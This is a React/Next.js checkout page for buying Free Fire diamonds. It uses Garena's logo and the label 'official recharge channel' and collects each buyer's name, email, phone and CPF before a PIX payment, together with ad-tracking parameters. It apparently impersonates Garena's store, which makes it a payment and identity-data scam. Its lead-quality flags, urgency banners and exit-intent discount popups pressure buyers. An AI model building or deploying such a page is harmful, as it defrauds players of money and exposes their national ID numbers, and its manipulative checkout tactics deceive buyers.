"use client"

import { useState, useEffect } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { ArrowLeft } from "lucide-react"
import PixModal from "../../components/pix-modal"
import Toast from "../../components/toast"
import ExitIntentModal from "../../components/exit-intent-modal"
import UrgencyBanner from "../../components/urgency-banner"
import { useUtmParams } from "@/hooks/useUtmParams"

export default function CheckoutPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const { utmParams } = useUtmParams()

  const [playerName, setPlayerName] = useState("")
  const [promoCode, setPromoCode] = useState("")
  const [fullName, setFullName] = useState("")
  const [email, setEmail] = useState("")
  const [phone, setPhone] = useState("")
  const [cpf, setCpf] = useState("")
  const [showPixModal, setShowPixModal] = useState(false)
  const [utmParameters, setUtmParameters] = useState<Record<string, string>>({})
  const [isProcessingPayment, setIsProcessingPayment] = useState(false)
  const [discountApplied, setDiscountApplied] = useState(false)
  const [discountAmount, setDiscountAmount] = useState(0)
  const [showToast, setShowToast] = useState(false)
  const [toastMessage, setToastMessage] = useState("")
  const [toastType, setToastType] = useState<"success" | "error" | "info">("success")
  const [showExitModal, setShowExitModal] = useState(false)
  const [exitAttempted, setExitAttempted] = useState(false)
  const [leadQualified, setLeadQualified] = useState(true)
  const [qualificationTimer, setQualificationTimer] = useState<NodeJS.Timeout | null>(null)
  const [showLowQualityIndicator, setShowLowQualityIndicator] = useState(false)

  // Get URL parameters
  const itemType = searchParams.get("itemType") || "recharge"
  const itemValue = searchParams.get("itemValue") || "1.060"
  const playerId = searchParams.get("playerId") || ""
  const price = searchParams.get("price") || "14.24"
  const paymentMethod = searchParams.get("paymentMethod") || "PIX"

  useEffect(() => {
    setPlayerName(playerId)
    
    // Capturar parâmetros UTM da URL atual
    const urlParams = new URLSearchParams(window.location.search)
    const utmData: Record<string, string> = {}
    
    // Lista de parâmetros para capturar
    const paramsToCapture = [
      'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
      'gclid', 'fbclid', 'src', 'sck', 'xcod', 'keyword', 'device', 'network', 'gad_source', 'gbraid'
    ]
    
    paramsToCapture.forEach(param => {
      const value = urlParams.get(param)
      if (value) {
        utmData[param] = value
      }
    })
    
    // Também usar parâmetros do hook como fallback
    Object.entries(utmParams).forEach(([key, value]) => {
      if (value && !utmData[key]) {
        utmData[key] = value
      }
    })
    
    setUtmParameters(utmData)
    console.log('[v0] Checkout - UTM Parameters captured:', utmData)
  }, [playerId, utmParams])

  const showToastMessage = (message: string, type: "success" | "error" | "info") => {
    setToastMessage(message)
    setToastType(type)
    setShowToast(true)
  }

  useEffect(() => {
    if (promoCode === "FF52188895" && !discountApplied) {
      const originalPrice = Number.parseFloat(price!)
      const discount = originalPrice * 0.05 // 5% desconto
      setDiscountAmount(discount)
      setDiscountApplied(true)
      showToastMessage("🎉 Código promocional aplicado! Desconto de 5% concedido!", "success")
    }
  }, [promoCode, price, discountApplied])

  const getFinalPrice = () => {
    const originalPrice = Number.parseFloat(price!)
    return discountApplied ? originalPrice - discountAmount : originalPrice
  }

  const handleExitModalStay = () => {
    setShowExitModal(false)
    if (!discountApplied) {
      setPromoCode('FF52188895')
      showToastMessage('🎁 Oferta especial aplicada! Desconto de 5% garantido!', 'success')
    }
  }

  const handleExitModalGoHome = () => {
    setShowExitModal(false)
    router.push('/')
  }

  const handleBannerApplyDiscount = () => {
    if (!discountApplied) {
      setPromoCode('FF52188895')
      showToastMessage('🎉 Desconto de urgência aplicado! Aproveite!', 'success')
      const promoSection = document.querySelector('[data-promo-section]')
      if (promoSection) {
        promoSection.scrollIntoView({ behavior: 'smooth', block: 'center' })
      }
    }
  }

  const calculateDiamondDetails = (diamonds: string) => {
    const diamondCount = Number.parseInt(diamonds.replace(".", "").replace(",", ""))
    const bonusMap: { [key: number]: number } = {
      100: 20, 310: 62, 520: 104, 1060: 212, 2180: 436, 5600: 1120, 15600: 3120,
    }
    const bonus = bonusMap[diamondCount] || 0
    const total = diamondCount + bonus
    return { original: diamondCount, bonus, total }
  }

  const handleBack = () => {
    if (!discountApplied && !exitAttempted) {
      setShowExitModal(true)
      setExitAttempted(true)
    } else {
      router.back()
    }
  }

  const handleProceedToPayment = () => {
    if (isProcessingPayment) {
      console.log("[v0] Checkout - Payment already in progress, ignoring click")
      return
    }

    if (!fullName.trim() || !email.trim() || !phone.trim() || !cpf.trim()) {
      alert("Por favor, preencha todos os campos obrigatórios.")
      return
    }

    if (!validateCpf(cpf)) {
      alert("Por favor, insira um CPF válido.")
      return
    }

    setIsProcessingPayment(true)
    console.log("[v0] Checkout - Starting payment process")
    setShowPixModal(true)
  }

  const formatPrice = (priceStr: string) => {
    return `R$ ${Number.parseFloat(priceStr).toFixed(2).replace(".", ",")}`
  }

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 11) {
      return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    }
    return value
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 10) {
      return numbers.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3")
    } else {
      return numbers.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
    }
  }

  const getPhoneNumbers = (formattedPhone: string) => {
    return formattedPhone.replace(/\D/g, "")
  }

  const validateCpf = (cpf: string) => {
    const numbers = cpf.replace(/\D/g, "")
    if (numbers.length !== 11) return false
    
    if (/^(\d)\1{10}$/.test(numbers)) return false
    
    let sum = 0
    for (let i = 0; i < 9; i++) {
      sum += parseInt(numbers[i]) * (10 - i)
    }
    let digit1 = 11 - (sum % 11)
    if (digit1 > 9) digit1 = 0
    
    sum = 0
    for (let i = 0; i < 10; i++) {
      sum += parseInt(numbers[i]) * (11 - i)
    }
    let digit2 = 11 - (sum % 11)
    if (digit2 > 9) digit2 = 0
    
    return parseInt(numbers[9]) === digit1 && parseInt(numbers[10]) === digit2
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value)
    setCpf(formatted)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    setPhone(formatted)
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <UrgencyBanner 
        onApplyDiscount={handleBannerApplyDiscount}
        hasDiscount={discountApplied}
        isLowQualityLead={!leadQualified}
      />
      
      {showLowQualityIndicator && (
        <div className="bg-gradient-to-r from-orange-500 to-red-600 text-white py-3 px-4 animate-pulse">
          <div className="max-w-4xl mx-auto text-center">
            <div className="flex items-center justify-center gap-2 text-sm font-medium">
              <span className="animate-bounce">⚠️</span>
              <span>Detectamos baixa interação - Oferta especial sendo preparada...</span>
              <span className="animate-bounce">⚠️</span>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white border-b border-gray-200 p-3 sm:p-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="w-8 h-8 sm:w-10 sm:h-10">
              <img src="/images/garena-logo.png" alt="Garena Logo" className="w-full h-full object-contain" />
            </div>
            <div>
              <h1 className="font-bold text-base sm:text-lg text-gray-800">Canal Oficial de</h1>
              <p className="text-xs sm:text-sm text-gray-600">Recarga</p>
            </div>
          </div>
        </div>
      </div>

      <div className="relative">
        <div className="w-full h-32 sm:h-48 md:h-64">
          <img src="/images/checkout-banner.webp" alt="Free Fire Banner" className="w-full h-full object-cover" />
        </div>

        <button
          onClick={handleBack}
          className="absolute top-3 left-3 sm:top-4 sm:left-4 bg-black bg-opacity-50 text-white p-2 rounded-full hover:bg-opacity-70 transition-all"
        >
          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>
      </div>

      <div className="text-center py-4 sm:py-6">
        <h2 className="text-xl sm:text-2xl font-bold text-gray-800">Free Fire</h2>
      </div>

      <div className="max-w-2xl mx-auto px-3 sm:px-4 pb-4 sm:pb-6">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
          {itemType === "recharge" ? (
            <>
              <div className="flex items-center justify-between mb-3 sm:mb-4">
                <span className="text-gray-600 text-sm sm:text-base">Total</span>
                <div className="flex items-center gap-2">
                  <img
                    src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png"
                    alt="Diamante"
                    className="w-4 h-4 sm:w-5 sm:h-5"
                  />
                  <span className="font-bold text-base sm:text-lg">
                    {calculateDiamondDetails(itemValue!).total.toLocaleString()}
                  </span>
                </div>
              </div>
            </>
          ) : (
            <div className="flex items-center justify-between mb-3 sm:mb-4">
              <span className="text-gray-600 text-sm sm:text-base">Oferta Especial</span>
              <span className="font-bold text-base sm:text-lg">{itemValue}</span>
            </div>
          )}

          <div className="flex items-center justify-between text-lg sm:text-xl font-bold border-t pt-3 sm:pt-4">
            <span>Preço {discountApplied ? 'Final' : ''}</span>
            <span className={discountApplied ? 'text-green-600' : ''}>
              {formatPrice(getFinalPrice().toString())}
            </span>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Nome Completo *</label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"
                placeholder="Digite seu nome completo"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Email *</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"
                placeholder="seu@email.com"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Telefone *</label>
              <input
                type="tel"
                value={phone}
                onChange={handlePhoneChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"
                placeholder="(11) 99999-9999"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">CPF *</label>
              <input
                type="text"
                value={cpf}
                onChange={handleCpfChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500"
                placeholder="000.000.000-00"
              />
              {cpf && !validateCpf(cpf) && (
                <p className="text-red-500 text-xs mt-1">CPF inválido</p>
              )}
            </div>
          </div>
        </div>

        <button
          onClick={handleProceedToPayment}
          disabled={isProcessingPayment}
          className={`w-full font-bold py-3 px-4 rounded-xl transition-all duration-200 shadow-lg ${
            isProcessingPayment 
              ? 'bg-gray-400 cursor-not-allowed text-white' 
              : 'bg-red-500 hover:bg-red-600 text-white'
          }`}
        >
          {isProcessingPayment ? 'Processando...' : 'Prosseguir para Pagamento'}
        </button>
      </div>

      <PixModal
        isOpen={showPixModal}
        onClose={() => {
          setShowPixModal(false)
          setIsProcessingPayment(false)
          console.log("[v0] Checkout - PIX modal closed, reset processing state")
        }}
        amount={getFinalPrice()}
        customerData={{
          name: fullName,
          email: email,
          phone: getPhoneNumbers(phone),
          document: cpf.replace(/\D/g, ""),
        }}
        utmParameters={utmParameters}
      />

      <Toast
        isVisible={showToast}
        message={toastMessage}
        type={toastType}
        onClose={() => setShowToast(false)}
      />

      <ExitIntentModal
        isOpen={showExitModal}
        onClose={() => setShowExitModal(false)}
        onStay={handleExitModalStay}
        onGoHome={handleExitModalGoHome}
        hasDiscount={discountApplied}
        discountCode="FF52188895"
        isLowQualityLead={!leadQualified}
      />
    </div>
  )
}
